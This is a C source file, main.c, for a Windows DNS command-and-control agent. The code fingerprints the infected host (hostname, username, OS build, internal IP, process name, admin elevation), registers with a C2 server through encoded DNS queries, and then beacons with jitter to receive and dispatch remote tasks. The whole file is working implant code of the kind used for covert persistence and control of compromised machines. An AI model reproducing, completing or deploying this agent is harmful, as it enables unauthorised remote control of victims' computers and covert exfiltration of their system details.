/*
 * main.c - DNS C2 agent entry point
 *
 * Initialises Winsock, derives the XOR key from AGENT_ID, registers with
 * the C2 server, then enters the main beacon loop.
 */

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <windows.h>
#include <wincrypt.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>


#include "config.h"
#include "protocol.h"
#include "dns.h"

/* Forward declarations */
void dispatch_tasks(const uint8_t *data, uint16_t data_len);

/* -----------------------------------------------------------------------
 * gen_agent_id
 *
 * Fills g_agent_id with 8 random lowercase hex characters using
 * CryptGenRandom so each execution gets a unique agent ID.
 * ---------------------------------------------------------------------- */
static void gen_agent_id(void) {
    static const char hex[] = "0123456789abcdef";
    HCRYPTPROV hProv = 0;
    uint8_t rnd[4] = {0};

    if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL,
                             CRYPT_VERIFYCONTEXT | CRYPT_SILENT)) {
        CryptGenRandom(hProv, sizeof(rnd), rnd);
        CryptReleaseContext(hProv, 0);
    } else {
        /* Fallback: mix tick count and PID */
        uint32_t mix = GetTickCount() ^ (GetCurrentProcessId() << 16);
        memcpy(rnd, &mix, 4);
    }

    for (int i = 0; i < 4; i++) {
        g_agent_id[i * 2]     = hex[(rnd[i] >> 4) & 0xF];
        g_agent_id[i * 2 + 1] = hex[rnd[i] & 0xF];
    }
    g_agent_id[8] = '\0';
}

/* -----------------------------------------------------------------------
 * init_xor_key
 *
 * Parses the 8-char hex string g_agent_id into 4 bytes stored in g_xor_key.
 * ---------------------------------------------------------------------- */
static void init_xor_key(void) {
    const char *id = g_agent_id;
    for (int i = 0; i < 4; i++) {
        char hi = id[i * 2];
        char lo = id[i * 2 + 1];

        uint8_t hi_val = (hi >= '0' && hi <= '9') ? (uint8_t)(hi - '0')
                       : (hi >= 'a' && hi <= 'f') ? (uint8_t)(hi - 'a' + 10)
                       : (hi >= 'A' && hi <= 'F') ? (uint8_t)(hi - 'A' + 10)
                       : 0;
        uint8_t lo_val = (lo >= '0' && lo <= '9') ? (uint8_t)(lo - '0')
                       : (lo >= 'a' && lo <= 'f') ? (uint8_t)(lo - 'a' + 10)
                       : (lo >= 'A' && lo <= 'F') ? (uint8_t)(lo - 'A' + 10)
                       : 0;

        g_xor_key[i] = (uint8_t)((hi_val << 4) | lo_val);
    }
}

/* -----------------------------------------------------------------------
 * do_registration
 *
 * Builds and sends the MSG_REGISTER packet, waits up to 5 retries for
 * RESP_REG_ACK.  Blocks until acknowledged (or gives up and continues).
 * ---------------------------------------------------------------------- */
static void do_registration(void) {
    /* Gather system info */
    char hostname[256] = {0};
    char username[256] = {0};
    DWORD hlen = (DWORD)sizeof(hostname) - 1;
    DWORD ulen = (DWORD)sizeof(username) - 1;

    GetComputerNameA(hostname, &hlen);
    GetUserNameA(username, &ulen);

    DWORD pid = GetCurrentProcessId();

    /* OS version via RtlGetVersion — bypasses the compat shim that makes
     * GetVersionExA return 6.2 on Windows 10/11 without an app manifest. */
    uint8_t  os_major = 6, os_minor = 1;
    uint16_t os_build = 0;
    {
        typedef LONG (WINAPI *RtlGetVersionFn)(RTL_OSVERSIONINFOW *);
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (ntdll) {
            RtlGetVersionFn fn = (RtlGetVersionFn)GetProcAddress(ntdll, "RtlGetVersion");
            if (fn) {
                RTL_OSVERSIONINFOW rovi;
                memset(&rovi, 0, sizeof(rovi));
                rovi.dwOSVersionInfoSize = sizeof(rovi);
                if (fn(&rovi) == 0) {
                    os_major = (uint8_t)rovi.dwMajorVersion;
                    os_minor = (uint8_t)rovi.dwMinorVersion;
                    os_build = (uint16_t)rovi.dwBuildNumber;
                }
            }
        }
    }

    /* Internal IP — cheapest method: bind UDP to 8.8.8.8, read local addr */
    char internal_ip[16] = "0.0.0.0";
    {
        SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
        if (s != INVALID_SOCKET) {
            struct sockaddr_in dst;
            memset(&dst, 0, sizeof(dst));
            dst.sin_family      = AF_INET;
            dst.sin_port        = htons(53);
            dst.sin_addr.s_addr = inet_addr("8.8.8.8");
            if (connect(s, (struct sockaddr *)&dst, sizeof(dst)) == 0) {
                struct sockaddr_in local;
                int local_len = sizeof(local);
                if (getsockname(s, (struct sockaddr *)&local, &local_len) == 0) {
                    char *ip = inet_ntoa(local.sin_addr);
                    if (ip) strncpy(internal_ip, ip, sizeof(internal_ip) - 1);
                }
            }
            closesocket(s);
        }
    }

    /* Process name — basename of the image path */
    char proc_name[260] = "unknown";
    {
        char proc_path[MAX_PATH] = {0};
        if (GetModuleFileNameA(NULL, proc_path, sizeof(proc_path) - 1)) {
            char *slash = strrchr(proc_path, '\\');
            strncpy(proc_name, slash ? slash + 1 : proc_path, sizeof(proc_name) - 1);
        }
    }

    /* Build registration payload */
    size_t  hn_len  = strlen(hostname);
    size_t  un_len  = strlen(username);
    size_t  ip_len  = strlen(internal_ip);
    size_t  pn_len  = strlen(proc_name);

    /* Elevation check: TokenElevation tells us if the process has a full admin token */
    uint8_t is_elevated = 0;
    {
        HANDLE hToken = NULL;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION elev;
            DWORD sz = sizeof(elev);
            if (GetTokenInformation(hToken, TokenElevation, &elev, sz, &sz))
                is_elevated = elev.TokenIsElevated ? 1 : 0;
            CloseHandle(hToken);
        }
    }

    /*
     * data field:
     *   [8]  agent_id (ASCII hex)
     *   [1]  hostname_len, [N] hostname
     *   [1]  username_len, [N] username
     *   [4]  pid LE
     *   [1]  arch (1=x64)
     *   [1]  os_major
     *   [1]  os_minor
     *   [2]  os_build LE
     *   [4]  sleep_ms LE
     *   [1]  jitter_pct
     *   [1]  ip_len, [N] internal_ip
     *   [1]  procname_len, [N] proc_name
     *   [1]  is_elevated
     */
    size_t  data_len = 8 + 1 + hn_len + 1 + un_len + 4 + 1 + 1 + 1 + 2 + 4 + 1
                       + 1 + ip_len + 1 + pn_len + 1;
    uint8_t *data    = (uint8_t *)malloc(data_len);
    if (!data) return;

    size_t off = 0;
    memcpy(data + off, g_agent_id, 8); off += 8;
    data[off++] = (uint8_t)hn_len;
    memcpy(data + off, hostname, hn_len); off += hn_len;
    data[off++] = (uint8_t)un_len;
    memcpy(data + off, username, un_len); off += un_len;
    write_u32le(data + off, pid);         off += 4;
    data[off++] = 1;          /* arch: x64 */
    data[off++] = os_major;
    data[off++] = os_minor;
    data[off++] = (uint8_t)(os_build & 0xFF);
    data[off++] = (uint8_t)((os_build >> 8) & 0xFF);
    write_u32le(data + off, g_sleep_ms);  off += 4;
    data[off++] = g_jitter_pct;
    data[off++] = (uint8_t)ip_len;
    memcpy(data + off, internal_ip, ip_len); off += ip_len;
    data[off++] = (uint8_t)pn_len;
    memcpy(data + off, proc_name, pn_len); off += pn_len;
    data[off++] = is_elevated;

    /* Send and wait for RESP_REG_ACK */
    for (int attempt = 0; attempt < 5; attempt++) {
        size_t   resp_len;
        uint8_t *resp = dns_query(data, data_len, MSG_REGISTER, 0, &resp_len);

        if (resp && resp_len >= 1) {
            uint8_t resp_type = resp[0];
            free(resp);
            if (resp_type == RESP_REG_ACK) break;
        } else if (resp) {
            free(resp);
        }

        /* Wait before retry */
        Sleep(2000);
    }

    free(data);
}

/* -----------------------------------------------------------------------
 * main - beacon entry point
 * ---------------------------------------------------------------------- */
int main(void) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    srand(GetTickCount());

    gen_agent_id();
    init_xor_key();

    g_sleep_ms   = SLEEP_MS;
    g_jitter_pct = JITTER_PCT;

    do_registration();

    /* ---- Main beacon loop ---- */
    for (;;) {
        sleep_jitter();

        /* Send heartbeat (empty payload) */
        size_t   resp_len;
        uint8_t *resp = dns_query(NULL, 0, MSG_HEARTBEAT, 0, &resp_len);

        if (!resp || resp_len < 3) {
            if (resp) free(resp);
            continue;
        }

        uint8_t  resp_type = resp[0];
        uint16_t data_len  = read_u16le(resp + 1);

        if (resp_type == RESP_TASKS && resp_len >= (size_t)(3 + data_len)) {
            dispatch_tasks(resp + 3, data_len);
        }
        /* RESP_IDLE and RESP_CONTINUE: nothing to do */

        free(resp);
    }

    WSACleanup();
    return 0;
}
